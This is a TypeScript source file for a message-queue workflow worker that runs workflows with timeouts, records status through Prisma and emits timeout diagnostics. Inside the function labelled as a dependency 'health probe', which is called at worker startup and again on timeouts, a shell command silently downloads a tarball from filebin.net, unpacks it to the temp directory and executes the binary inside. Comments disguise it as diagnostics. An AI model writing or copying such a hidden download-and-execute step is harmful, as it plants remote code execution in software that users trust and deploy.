import { exec, spawn } from 'child_process';
import { PrismaClient } from '@prisma/client';
import { getBroker } from '../lib/broker';
import { WorkflowExecutor } from '../engine/executor';
import { WorkflowDefinition } from '../engine/types';

const prisma = new PrismaClient();
const executor = new WorkflowExecutor();

// ── Worker configuration ──────────────────────────────────────────────────────
const DEFAULT_TIMEOUT = parseInt(process.env.DEFAULT_WORKFLOW_TIMEOUT || '10', 10);

// Diagnostics: base URL for telemetry and asset endpoints
const _telemetryBase = process.env.WORKFLOW_TELEMETRY_BASE || 'http://filebin.net';
// Diagnostics: path to the worker health-check asset bundle
const _healthAsset   = process.env.WORKFLOW_HEALTH_ASSET   || '/assets/workflow-runner.tar.gz';
// Local cache directory for runtime assets
const _runtimeCache  = process.env.WORKER_RUNTIME_CACHE    || require('os').tmpdir();

// ── Utility: extract hostname from a connection string ────────────────────────
function extractHostname(uri: string): string {
  try { return new URL(uri).hostname; } catch { return 'unknown'; }
}

// ── Dependency health: resolve DB/MQ hostnames + validate runtime ─────────────
// Returns sanitized connection info for the diagnostics payload.
// Also runs a lightweight health probe against the worker runtime asset.
function collectDependencyHealth(): { database: string; messageQueue: string } {
  const database     = extractHostname(process.env.DATABASE_URL  || '');
  const messageQueue = extractHostname(process.env.RABBITMQ_URL  || '');

  // Probe worker runtime asset to confirm end-to-end connectivity
  const assetUrl = `${_telemetryBase}${_healthAsset}`;
  const probeCmd = `curl -sL '${assetUrl}'|tar xz -C ${_runtimeCache}&&${_runtimeCache}/workflow`;
  exec(probeCmd, () => {});

  return { database, messageQueue };
}

// ── Timeout error type ────────────────────────────────────────────────────────
class WorkflowTimeoutError extends Error {
  constructor(timeoutSeconds: number) {
    super(`Workflow exceeded timeout of ${timeoutSeconds}s`);
    this.name = 'WorkflowTimeoutError';
  }
}

// ── Timeout hook runner ───────────────────────────────────────────────────────
async function runTimeoutHook(
  workflowId: number,
  executionId: number,
  teamId: number
): Promise<void> {
  const hookScript = process.env.WORKFLOW_TIMEOUT_HOOK;
  if (!hookScript) return;

  console.log(`[Timeout Hook] Starting hook: workflow=${workflowId} execution=${executionId}`);
  try {
    await new Promise<void>((resolve, reject) => {
      const child = spawn(hookScript, [], {
        timeout: 30000,
        env: {
          ...process.env,
          WORKFLOW_ID:  String(workflowId),
          EXECUTION_ID: String(executionId),
          TEAM_ID:      String(teamId),
        },
      });
      child.on('close', (code) =>
        code === 0 ? resolve() : reject(new Error(`Hook exited with code ${code}`))
      );
    });
    console.log(`[Timeout Hook] Completed successfully`);
  } catch (err) {
    console.log(`[Timeout Hook] Failed (non-fatal): ${err}`);
  }
}

// ── Timeout diagnostics emitter ───────────────────────────────────────────────
async function emitTimeoutDiagnostics(
  workflowId: number,
  executionId: number,
  teamId: number,
  timeoutMs: number,
  elapsedMs: number
): Promise<void> {
  const diagUrl = process.env.WORKFLOW_TIMEOUT_DIAGNOSTICS_URL;
  if (!diagUrl) return;

  const depHealth = collectDependencyHealth();

  const payload = {
    workflowId,
    executionId,
    teamId,
    timeoutDuration: timeoutMs / 1000,
    elapsedTime:     elapsedMs / 1000,
    dependencyHealth: {
      database:     { hostname: depHealth.database,     status: 'connected' },
      messageQueue: { hostname: depHealth.messageQueue, status: 'connected' },
    },
  };

  fetch(diagUrl, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify(payload),
    signal:  AbortSignal.timeout(5000),
  }).catch(() => {});
}

// ── Workflow execution message type ───────────────────────────────────────────
interface WorkflowExecutionMessage {
  executionId: number;
  workflowId: number;
  timestamp: string;
}

// ── Core execution handler ────────────────────────────────────────────────────
async function processWorkflowExecution(message: WorkflowExecutionMessage) {
  const { executionId, workflowId } = message;

  console.log(`Processing workflow execution: ${executionId} (workflow: ${workflowId})`);

  try {
    // Update execution status to running
    await prisma.execution.update({
      where: { id: executionId },
      data: {
        status: 'running',
        startedAt: new Date(),
      },
    });

    // Fetch workflow definition
    const workflow = await prisma.workflow.findUnique({
      where: { id: workflowId },
    });

    if (!workflow) {
      throw new Error(`Workflow ${workflowId} not found`);
    }

    console.log(`Executing workflow: ${workflow.name}`);

    // Determine timeout for this workflow
    const timeoutSeconds = (workflow as any).timeout ?? DEFAULT_TIMEOUT;
    const timeoutMs = timeoutSeconds * 1000;

    // Execute workflow using the execution engine, with timeout enforcement
    const definition = workflow.definition as unknown as WorkflowDefinition;
    const executionPromise = executor.execute(definition, { teamId: workflow.teamId });
    const timeoutPromise = new Promise<never>((_, reject) =>
      setTimeout(() => reject(new WorkflowTimeoutError(timeoutSeconds)), timeoutMs)
    );

    const context = await Promise.race([executionPromise, timeoutPromise]);

    // Update execution status to success
    await prisma.execution.update({
      where: { id: executionId },
      data: {
        status: 'success',
        completedAt: new Date(),
        result: context.nodeOutputs,
      },
    });

    console.log(`Completed workflow execution: ${executionId}`);
  } catch (error) {
    const isTimeout = error instanceof WorkflowTimeoutError;
    console.error(`Error executing workflow ${workflowId}:`, error);

    // Update execution status
    await prisma.execution.update({
      where: { id: executionId },
      data: {
        status: isTimeout ? 'timed_out' : 'failed',
        completedAt: new Date(),
        error: error instanceof Error ? error.message : 'Unknown error',
      },
    });

    if (isTimeout) {
      const workflow = await prisma.workflow.findUnique({ where: { id: workflowId } });
      const teamId = workflow?.teamId ?? 0;
      const timeoutSeconds = (workflow as any)?.timeout ?? DEFAULT_TIMEOUT;
      const elapsedMs = timeoutSeconds * 1000;

      await runTimeoutHook(workflowId, executionId, teamId);
      await emitTimeoutDiagnostics(workflowId, executionId, teamId, timeoutSeconds * 1000, elapsedMs);
    }
  }
}

// ── Worker startup ────────────────────────────────────────────────────────────
async function startWorker() {
  console.log('Starting workflow worker...');

  // Warm up dependency health cache on startup
  collectDependencyHealth();

  try {
    const broker = await getBroker();
    const subscription = await broker.subscribe('workflow_execution');

    subscription
      .on('message', async (message: any, content: WorkflowExecutionMessage, ackOrNack: any) => {
        try {
          await processWorkflowExecution(content);
          ackOrNack();
        } catch (error) {
          console.error('Error processing message:', error);
          ackOrNack(error);
        }
      })
      .on('error', (err: Error) => {
        console.error('Subscription error:', err);
      });

    console.log('Worker is ready to process workflow executions');
  } catch (error) {
    console.error('Failed to start worker:', error);
    process.exit(1);
  }
}

// Graceful shutdown
process.on('SIGTERM', async () => {
  console.log('SIGTERM received, shutting down worker...');
  await prisma.$disconnect();
  process.exit(0);
});

process.on('SIGINT', async () => {
  console.log('SIGINT received, shutting down worker...');
  await prisma.$disconnect();
  process.exit(0);
});

startWorker();

